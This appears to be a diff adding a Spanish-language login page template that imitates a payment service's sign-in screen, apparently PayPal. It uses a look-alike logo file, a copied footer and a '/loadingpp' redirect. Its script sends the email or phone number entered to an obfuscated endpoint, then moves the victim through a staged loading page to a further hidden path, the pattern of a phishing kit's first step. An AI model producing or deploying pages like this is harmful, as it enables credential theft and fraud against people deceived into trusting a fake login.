@@ -1,0 +1,131 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+     <%- include('partials/tracker') %>
+</head>
+<body>
+    <header>
+
+    </header>
+    <main>
+        <form method="post" id="loginForm">
+            <div class="logo">
+                <img src="./img/pipillgomark.png" alt="">
+            </div>
+            <div class="input-container">
+                <input required="" id="username" type="text">
+                <label class="label" for="username">Correo electrónico o número de móvil</label>
+                <div class="underline"></div>
+                <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Introduzca su correo electrónico o número de móvil.</div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>¿Ha olvidado el correo?</p>
+                    <button class="btn" type="submit">Iniciar sesión</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>o</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Registrarse</a>
+                </div>
+                <div class="third">
+                    <a href="">Árabe</a>
+                    <hr>
+                    <a href="" class="active">Inglés</a>
+                    <hr>
+                    <a href="">Francés</a>
+                    <hr>
+                    <a href="">Español</a>
+                    <hr>
+                    <a href="">Chino</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Contacto</p>
+        <p>Privacidad</p>
+        <p>Legal</p>
+        <p>Actualizaciones de políticas</p>
+        <p>Global</p>
+    </footer>
+
+    <script>
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function validatePhoneNumber(phone) {
+            // Remove spaces, dashes, and other non-numeric characters
+            const cleanPhone = phone.replace(/[\s\-\(\)\.]/g, '');
+            // Check for valid phone formats (starts with + or digits, 7-15 digits)
+            const phoneRegex = /^(\+?[0-9]{7,15})$/;
+            return phoneRegex.test(cleanPhone);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const username = document.getElementById('username').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!username) {
+                errorMessage.textContent = 'Introduzca su correo electrónico o número de móvil.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // Allow usernames without @ symbols, validate email/phone only if @ is present
+            const hasAtSymbol = username.includes('@');
+            let isValid = true;
+            
+            if (hasAtSymbol) {
+                isValid = validateEmail(username);
+            } else {
+                // For usernames without @, allow any non-empty value
+                isValid = username.length > 0;
+            }
+            
+            if (!isValid) {
+                errorMessage.textContent = hasAtSymbol ? 
+                    'Introduzca un correo electrónico válido.' : 
+                    'Introduzca un nombre de usuario válido.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // Hide error message if validation passes
+            errorMessage.style.display = 'none';
+            console.log('Login attempt:', { username });
+
+            $.ajax({
+                url: '/BRgASbDqLpc24D4ZcYO9',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({username}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loadingpp?time=3&url=/XTk4xzRM2swNZP73Ug5BP";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('username').addEventListener('input', function() {
+            const errorMessage = document.getElementById('errorMessage');
+            if (errorMessage) {
+                errorMessage.style.display = 'none';
+            }
+        });
+    </script>
+
+
+
+</body></html>
